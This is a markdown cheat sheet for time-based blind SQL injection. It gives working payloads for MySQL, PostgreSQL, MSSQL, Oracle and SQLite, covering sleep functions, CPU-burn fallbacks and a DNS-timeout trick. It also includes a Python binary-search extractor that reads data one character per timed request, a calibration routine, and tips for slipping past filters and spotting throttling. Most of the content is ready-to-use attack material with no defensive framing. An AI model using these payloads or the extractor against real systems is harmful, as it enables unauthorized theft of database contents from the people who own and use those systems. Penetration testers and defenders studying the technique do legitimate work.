# Time-based blind SQLi — extraction through the clock

Use when true and false pages are byte-identical (or near enough that
jitter swamps the difference) but the server takes measurably longer
when a condition holds. The oracle is one bit per request — like
boolean-blind, but the bit travels in response time instead of body.

Discipline that makes this channel reliable:

- Measure baseline RTT first — 3–5 requests, median + jitter. A
  payload must move the RTT by an amount bigger than 3× jitter or
  the "signal" is network noise.
- Keep probes strictly sequential. Two concurrent requests share the
  DB connection pool and smear both timings.
- CPU-burn delays (BENCHMARK, heavy joins) are noisy on shared
  infra; explicit sleep functions are cleaner — use them when
  available, fall back to CPU when filtered.
- One conditional sleep can fire PER ROW on some plans. Prefer a
  scalar `SELECT sleep()` subquery or put the sleep behind
  `IF(cond,...)` where only the true branch runs it.

---

## 1. Sleep functions per DBMS

### MySQL / MariaDB

```sql
' AND SLEEP(5)-- -
' AND (SELECT SLEEP(5))-- -
' OR IF(1=1,SLEEP(5),0)-- -
' AND IF(ASCII(SUBSTRING(user(),1,1))>100,SLEEP(3),0)-- -
' AND (SELECT CASE WHEN 1=1 THEN SLEEP(4) ELSE 0 END)-- -
```

`SLEEP(x)` inside a WHERE over N rows sleeps ~N×x on some engines —
the scalar form `(SELECT SLEEP(5))` runs once. When SLEEP is
filtered: `BENCHMARK(20000000,SHA1('a'))` or `BENCHMARK(5e6,MD5(NOW()))`
burns CPU instead (~2–4 s, tune once).

Heavy-query alternative when functions are stripped:

```sql
' AND (SELECT COUNT(*) FROM information_schema.columns a,
   information_schema.columns b, information_schema.columns c)>0-- -
```

### PostgreSQL

pg_sleep returns void — wrap it so the query stays valid:

```sql
'; SELECT pg_sleep(5)-- -                                  -- stacked (when allowed)
' AND 1=(SELECT 1 FROM pg_sleep(5))-- -                    -- type error: void
' AND (SELECT pg_sleep(5)) IS NULL-- -                     -- pg_sleep() is not null
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3)
     ELSE pg_sleep(0) END) IS NULL-- -                     -- conditional
' OR (SELECT CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>100)
     THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL-- -
```

`pg_sleep(x)` inside CASE works and is the reliable non-stacked form.
CPU fallback:

```sql
' AND (SELECT COUNT(*) FROM generate_series(1,30000000))>0-- -
' AND (SELECT md5(generate_series::text) FROM generate_series(1,5000000))>''-- -
```

`generate_series` cross-product is slower to filter than pg_sleep.

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'-- -
' WAITFOR DELAY '0:0:5'-- -                -- inside string context
' IF 1=1 WAITFOR DELAY '0:0:5'-- -
' IF ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))>100
   WAITFOR DELAY '0:0:3'-- -
'; IF (SELECT COUNT(*) FROM sys.tables)>0 WAITFOR DELAY '0:0:4'-- -
```

`WAITFOR` inside a SELECT needs IF (it is a statement, not a
function). CPU fallback:

```sql
' AND (SELECT COUNT(*) FROM sys.columns a, sys.columns b,
   sys.columns c)>0-- -
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('k',5)-- -               -- sleep 5 s
' AND (SELECT COUNT(*) FROM all_users a, all_users b,
   all_users c)>0-- -                                      -- CPU heavy
' AND UTL_INADDR.GET_HOST_ADDRESS('definitely.invalid.tld')
   IS NULL-- -                                             -- DNS timeout
' AND 1=(DBMS_PIPE.RECEIVE_MESSAGE('x',3))-- -
```

`DBMS_PIPE.RECEIVE_MESSAGE` needs execute rights (often present);
the DNS-resolution timeout variant rides outbound DNS instead.

### SQLite

No sleep function — use CPU burn or regex-blob torture:

```sql
' AND (SELECT COUNT(*) FROM sqlite_master a,sqlite_master b,
   sqlite_master c,sqlite_master d)>0-- -
' AND randomblob(200000000)>0-- -
' AND like('ABCDEFG',upper(hex(randomblob(300000000))))-- - -- classic trick:
     LIKE pattern is scanned char-by-char over a giant string
' AND (SELECT 1 WHERE 1=1 AND
   like('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',upper(hex(randomblob(100000000)))))-- -
```

---

## 2. The extraction loop

Same binary search as boolean-blind, with the clock as comparator:

```python
def char_at(pos, subq):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        payload = (f"' AND IF(ASCII(SUBSTRING(({subq}),{pos},1))>{mid},"
                   f"SLEEP(3),0)-- -")
        if timed_request(payload) > baseline + delay_margin:
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)
```

Per-DBMS condition wrappers:

```sql
MySQL:      IF(cond,SLEEP(3),0) / (CASE WHEN cond THEN SLEEP(3) END)
Postgres:   (CASE WHEN cond THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL
MSSQL:      IF cond WAITFOR DELAY '0:0:3'          (statement level)
Oracle:     CASE WHEN cond THEN DBMS_PIPE.RECEIVE_MESSAGE('k',3)
            ELSE NULL END ... or conditional UTL_INADDR DNS miss
SQLite:     CASE WHEN cond THEN like('AAA...',upper(hex(randomblob(N))))
            ELSE 1 END
```

Get the value LENGTH first with the same loop on `LENGTH(x)>n`, so
the extractor knows when to stop.

---

## 3. Measurement hygiene that decides success

- Sleep 3× jitter minimum. If baseline RTT jitters ±300 ms, use
  ≥1.5 s delays; ±1 s → use 4–5 s. Longer is slower but honest;
  shorter produces garbage faster.
- Re-ask on outliers: a single +3 s response could be GC, deploy,
  or another user's heavy query. Require the same question to
  repeat-delay twice before trusting it.
- Keep a spare sleep probe (`AND SLEEP(3)` unconditional) as a
  channel-alive check every ~50 requests — if IT stops delaying,
  you got throttled/blocked, not "all chars extracted".
- Servers often queue requests — measure SERVER-SIDE order: send
  `SLEEP(5)` then a normal request; if the normal one also slows,
  the pool is serialised → halve concurrency assumptions.
- Rate limiters kill this channel silently (requests return 429
  fast → reads as "false"). Detect with a periodic unconditional
  sleep as above.

---

## 4. When the app is async

Job-queue / report-style sinks: the HTTP response returns before the
query runs — time your *read of the consumer* not the write. If
nothing measurable exists anywhere, the oracle is dead — go to
`oob.md` (DNS) or `error-based.md` (if any error text exists).

---

## 5. Calibration snippet

```python
import time, statistics
def calibrate(url, send):
    base = [send("") for _ in range(5)]
    base_t = statistics.median(base)
    jit = max(base) - min(base)
    d = send("' AND SLEEP(3)-- -")
    print(f"baseline={base_t:.2f}s jitter={jit:.2f}s "
          f"sleep={d:.2f}s usable={d > base_t + 3*jit}")
```

Time channels are the LAST resort of the inline trio — slower than
boolean-blind by an order of magnitude. Only spend it when body diff
and error text are both dead.
